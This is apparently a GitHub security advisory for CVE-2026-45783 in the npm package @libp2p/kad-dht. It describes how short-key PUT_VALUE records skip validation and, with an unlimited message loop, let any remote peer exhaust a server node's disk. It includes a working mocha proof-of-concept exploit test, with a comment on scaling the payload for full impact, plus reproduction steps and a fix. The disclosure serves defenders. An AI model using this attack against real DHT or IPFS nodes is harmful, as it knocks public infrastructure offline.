# [H] @libp2p/kad-dht: Unvalidated PUT_VALUE records allow unbounded disk exhaustion on DHT server nodes

## Summary
Severity: High
Advisory: GHSA-32mq-hpph-xfvr
CVE: CVE-2026-45783
CWE: CWE-20, CWE-400
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-05-19
Source: https://github.com/advisories/GHSA-32mq-hpph-xfvr
Type: github-advisory

## Affected
- npm: `@libp2p/kad-dht` — affected >=0 <16.2.6

## Details
### Summary
An unauthenticated remote peer can exhaust the disk storage of any `@libp2p/kad-dht` node running in server mode by sending an unbounded stream of `PUT_VALUE` messages whose keys bypass all content validation. No credentials, no prior relationship, and no protocol deviation beyond a crafted key are required. The victim node's datastore fills until the host disk is exhausted, making the node unavailable.

### Details
Two cooperating defects combine to produce the vulnerability.                           
                                                     
**Defect 1: `verifyRecord` silent early-return (`packages/kad-dht/src/record/validators.ts:19-21`)**                                                                                                                 
                                                                                                           
```typescript                                                                                                                                                                                                         
export async function verifyRecord(validators: Validators, record: Libp2pRecord, options?: AbortOptions): Promise<void> {                                                                                             
  const key = record.key                                                                                   
  const keyString = uint8ArrayToString(key)   // decode as UTF-8
  const parts = keyString.split('/')                                                                       
                                                                                                           
  if (parts.length < 3) {                                                                                                                                                                                             
    // No validator available                                                                              
    return                          // <- silent success; record IS written to datastore
  }                                                                                                        
  // ...                                             
}                                                                                                                                                                                                                     
```

Legitimate DHT keys (`/pk/<multihash>`, `/ipns/<peerId>`) have exactly 3 slash-delimited parts and are routed to registered validators. Any key whose UTF-8 representation splits into fewer than 3 parts, single-byte keys, or any value without two `/` characters, thus, bypasses validation entirely and is written to the datastore unconditionally. There is no audit log and no error returned to the caller.

**Defect 2: Unbounded RPC message loop (`packages/kad-dht/src/rpc/index.ts:103-152`)**                                                                                                                               
                                                                                                                                                                                                                      
```typescript                                                                                              
let signal = AbortSignal.timeout(this.incomingMessageTimeout)  // 10 s inactivity timer
signal.addEventListener('abort', abortListener)      
const messages = pbStream(stream).pb(Message)  // DEFAULT_MAX_DATA_LENGTH = 4 MB

while (true) {
  if (stream.readStatus !== 'readable') { await stream.close({ signal }); break }
  const message = await messages.read({ signal })
  await this.handleMessage(connection.remotePeer, message)
  // ...
  signal.removeEventListener('abort', abortListener)
  signal = AbortSignal.timeout(this.incomingMessageTimeout)  // timer RESET each message
  signal.addEventListener('abort', abortListener)
}
```

The inactivity timeout is reset after **every successfully received message**. There is no per-stream message count limit, no per-peer byte budget, and no rate limiter. An attacker who delivers each message within the 10-second window can stream an unlimited number of messages indefinitely.

**Combined impact**

- `DEFAULT_MAX_DATA_LENGTH = 4 MB` per message (from `@libp2p/utils`)
- `DEFAULT_MAX_INBOUND_STREAMS = 32` concurrent streams per `kad-dht` instance
- Attack throughput: 4 MB × unlimited messages × 32 streams
- Minimum attacker cost: standard libp2p TLS handshake (no authentication beyond that)

**Differential note**: `go-libp2p-kad-dht` enforces `record.Validator.Validate()` per-key at the RPC layer; records with unrecognised namespaces are rejected with an error, not silently stored. This divergence is JS-specific.

### PoC
The proof-of-concept is a mocha test checked in alongside the package test suite. It uses an in-memory stream pair, thus, no network traffic, no external connections.

**File**: `packages/kad-dht/test/rpc/poc-put-value-unvalidated.spec.ts`:

```typescript
/**
 * PoC: kad-dht PUT_VALUE stored without validation for keys with < 3 slash-separated parts
 *
 * Affected: packages/kad-dht/src/record/validators.ts:19-22
 *           packages/kad-dht/src/rpc/handlers/put-value.ts
 *           packages/kad-dht/src/rpc/index.ts (unbounded while loop)
 */

/* eslint-env mocha */

import assert from 'node:assert'
import { start } from '@libp2p/interface'
import { defaultLogger } from '@libp2p/logger'
import { persistentPeerStore } from '@libp2p/peer-store'
import { Libp2pRecord } from '@libp2p/record'
import { streamPair } from '@libp2p/utils'
import { MemoryDatastore } from 'datastore-core'
import * as lp from 'it-length-prefixed'
import { TypedEventEmitter } from 'main-event'
import pDefer from 'p-defer'
import Sinon from 'sinon'
import { stubInterface } from 'sinon-ts'
import { StreamMessageEvent } from '@libp2p/interface'
import { toString as uint8ArrayToString } from 'uint8arrays/to-string'
import { Message, MessageType } from '../../src/message/dht.js'
import { PeerRouting } from '../../src/peer-routing/index.js'
import { Providers } from '../../src/providers.js'
import { RoutingTable } from '../../src/routing-table/index.js'
import { RPC } from '../../src/rpc/index.js'
import { passthroughMapper } from '../../src/utils.js'
import { createPeerIdWithPrivateKey } from '../utils/create-peer-id.js'
import type { Validators } from '../../src/index.js'
import type { RPCComponents } from '../../src/rpc/index.js'
import type { Connection, Libp2pEvents } from '@libp2p/interface'
import type { AddressManager } from '@libp2p/interface-internal'
import type { Datastore } from 'interface-datastore'

describe('PoC: PUT_VALUE stores data without validation for short keys', function () {
  this.timeout(15_000)

  let rpc: RPC
  let datastore: Datastore

  beforeEach(async () => {
    const peerId = await createPeerIdWithPrivateKey()
    datastore = new MemoryDatastore()

    const components: RPCComponents = {
      peerId: peerId.peerId,
      datastore,
      peerStore: stubInterface(),
      addressManager: stubInterface<AddressManager>(),
      logger: defaultLogger()
    }
    components.peerStore = persistentPeerStore({
      ...components,
      events: new TypedEventEmitter<Libp2pEvents>()
    })

    await start(...Object.values(components))

    // Default validators: only 'pk' and 'ipns' in production.
    // Empty {} means: any key with ≥3 parts but unknown type throws; any key
    // with <3 parts silently passes (the bypass under test).
    const validators: Validators = {}

    rpc = new RPC(components, {
      routingTable: Sinon.createStubInstance(RoutingTable),
      providers: Sinon.createStubInstance(Providers),
      peerRouting: Sinon.createStubInstance(PeerRouting),
      validators,
      logPrefix: '',
      metricsPrefix: '',
      datastorePrefix: '',
      peerInfoMapper: passthroughMapper
    })
  })

  it('BYPASS: verifyRecord returns early for key with < 3 slash-delimited parts', async () => {
    // Key bytes that, when decoded as UTF-8, produce a string with only 1 part
    // when split on '/': [0x01, 0x02, 0x03] → "\x01\x02\x03" → length 1 < 3
    const craftedKey = new Uint8Array([0x01, 0x02, 0x03])
    const keyStr = uint8ArrayToString(craftedKey)
    const parts = keyStr.split('/')
    assert.ok(parts.length < 3,
      `key produces ${parts.length} parts — expected < 3 for bypass`)

    const PAYLOAD_SIZE = 64 * 1024  // 64 KB — replace with 4 * 1024 * 1024 for full impact
    const largeValue = new Uint8Array(PAYLOAD_SIZE).fill(0xAB)

    const record = new Libp2pRecord(craftedKey, largeValue, new Date())
    const encodedRecord = record.serialize()

    const msg: Partial<Message> = {
      type: MessageType.PUT_VALUE,
      key: craftedKey,
      record: encodedRecord
    }

    // Confirm datastore is empty before the attack
    const before: string[] = []
    for await (const { key } of datastore.query({})) {
      before.push(key.toString())
    }
    assert.strictEqual(before.filter(k => k.includes('/record/')).length, 0,
      'datastore must be empty before attack')

    // Open an in-memory stream pair.
    // outboundStream = attacker; incomingStream = victim.
    const [outboundStream, incomingStream] = await streamPair()

    // Wait for the echoed response (PUT_VALUE handler returns the message).
    // This confirms the victim processed the message before we check the store.
    const responseReceived = pDefer<void>()
    outboundStream.addEventListener('message', (evt) => {
      // LP-decode the response and verify it's our PUT_VALUE echo
      for (const buf of lp.decode([(evt as StreamMessageEvent).data])) {
        const response = Message.decode(buf)
        if (response.type === MessageType.PUT_VALUE) {
          responseReceived.resolve()
        }
      }
    })

    // Schedule message send after victim starts listening (mirrors existing test pattern)
    queueMicrotask(() => {
      outboundStream.send(lp.encode.single(Message.encode(msg)))
    })

    // Start victim processing — do not await yet
    const victimDone = rpc.onIncomingStream(
      incomingStream,
      stubInterface<Connection>()
    )

    // Wait until the victim has processed and echoed the message
    await responseReceived.promise

    // Verify: arbitrary record was stored
    const after: string[] = []
    for await (const { key } of datastore.query({})) {
      after.push(key.toString())
    }
    const dhtRecordsAfter = after.filter(k => k.includes('/record/'))

    assert.ok(dhtRecordsAfter.length > 0,
      'VULNERABILITY CONFIRMED: arbitrary record stored without validation')

    console.log(`\n[PoC] Datastore key written:  ${dhtRecordsAfter[0]}`)
    console.log(`[PoC] Bypassed validator with: key=[${Array.from(craftedKey).map(b => `0x${b.toString(16)}`).join(',')}]`)
    console.log(`[PoC] Payload stored:          ${PAYLOAD_SIZE} bytes (${PAYLOAD_SIZE / 1024} KB)`)

    // Clean up: abort the stream so victimDone resolves
    incomingStream.abort(new Error('test cleanup'))
    await victimDone.catch(() => {})
  })

  it('RATE: N PUT_VALUE writes with different keys grow the datastore unchecked', async () => {
    const MESSAGES = 8
    const VALUE_SIZE = 16 * 1024  // 16 KB each

    for (let i = 0; i < MESSAGES; i++) {
      // Unique key per message → unique datastore entry per write
      const craftedKey = new Uint8Array([0x10, (i >> 8) & 0xFF, i & 0xFF])
      const value = new Uint8Array(VALUE_SIZE).fill(i & 0xFF)
      const record = new Libp2pRecord(craftedKey, value, new Date())

      const msg: Partial<Message> = {
        type: MessageType.PUT_VALUE,
        key: craftedKey,
        record: record.serialize()
      }

      const [outboundStream, incomingStream] = await streamPair()

      const responseReceived = pDefer<void>()
      outboundStream.addEventListener('message', () => { responseReceived.resolve() })

      queueMicrotask(() => { outboundStream.send(lp.encode.single(Message.encode(msg))) })
      const victimDone = rpc.onIncomingStream(incomingStream, stubInterface<Connection>())

      await responseReceived.promise
      incomingStream.abort(new Error('test cleanup'))
      await victimDone.catch(() => {})
    }

    const keys: string[] = []
    for await (const { key } of datastore.query({})) {
      keys.push(key.toString())
    }
    const dhtRecords = keys.filter(k => k.includes('/record/'))

    assert.strictEqual(dhtRecords.length, MESSAGES,
      `expected ${MESSAGES} records stored`)

    const totalKB = (MESSAGES * VALUE_SIZE) / 1024
    console.log(`\n[PoC] ${MESSAGES} records stored → ${totalKB} KB written`)
    console.log('[PoC] No per-peer write budget. No per-stream message count limit.')
    console.log('[PoC] Production impact: 4 MB/msg × N msgs per stream × 32 streams = disk exhaustion.')
  })
})
```

**Steps to reproduce** (tested on commit `15eeedba13846e55e8fc3f9e4c49af18fa185ea4`):

```bash
git clone https://github.com/libp2p/js-libp2p.git
cd js-libp2p
npm install
cd packages/kad-dht
npx aegir build
node --experimental-vm-modules ../../node_modules/.bin/mocha \
  'dist/test/rpc/poc-put-value-unvalidated.spec.js' --timeout 30000
```

**Expected output**:

```
PoC: PUT_VALUE stores data without validation for short keys

[PoC] Datastore key written:  /record/aebag
[PoC] Bypassed validator with: key=[0x1,0x2,0x3]
[PoC] Payload stored:          65536 bytes (64 KB)
    ✔ BYPASS: verifyRecord returns early for key with < 3 slash-delimited parts

[PoC] 8 records stored → 128 KB written
[PoC] No per-peer write budget. No per-stream message count limit.
[PoC] Production impact: 4 MB/msg × N msgs per stream × 32 streams = disk exhaustion.
    ✔ RATE: N PUT_VALUE writes with different keys grow the datastore unchecked

2 passing (44ms)
```

**Test 1** (`BYPASS`) confirms that a single `PUT_VALUE` message with a 3-byte raw key stores a 64 KB payload in the victim's datastore with no validation.

**Test 2** (`RATE`) confirms that N sequential writes with distinct keys each produce a new datastore entry, demonstrating the absence of any write budget or deduplication defence.

### Impact
**Affected deployments**: any `@libp2p/kad-dht` node in **server mode** (`clientMode: false`). Server mode is the default for nodes with publicly routable addresses; the `kad-dht` module auto-switches to server mode (`kad-dht.ts:340-358`). This includes:
- IPFS nodes (kubo, Helia, any JS IPFS implementation)
- libp2p bootstrap nodes
- Any application exposing a public DHT endpoint

**Not affected**: DHT client-mode nodes, `setMode('client')` calls `registrar.unhandle(this.protocol)` which removes the inbound stream handler entirely.

**Availability (disk)**: attacker fills the victim's datastore partition. A full datastore prevents the victim from writing new DHT records, peer store entries, or any other application data sharing the same datastore backend (common in IPFS nodes using a shared `repo` datastore). Node becomes unavailable.

**No authentication barrier**: the only prerequisite is a successful libp2p connection handshake (TLS). Any publicly reachable node is exposed.

**Suggested minimum fix**:
Change the silent early-return to a hard rejection:
                                                                                                           
```diff
-  if (parts.length < 3) {
-    // No validator available
-    return
-  }
+  if (parts.length < 3) {
+    throw new InvalidParametersError(`Record key has no recognisable namespace: refusing to store`)
+  }
```

## References
- https://github.com/libp2p/js-libp2p/security/advisories/GHSA-32mq-hpph-xfvr
- https://nvd.nist.gov/vuln/detail/CVE-2026-45783
- https://github.com/libp2p/js-libp2p
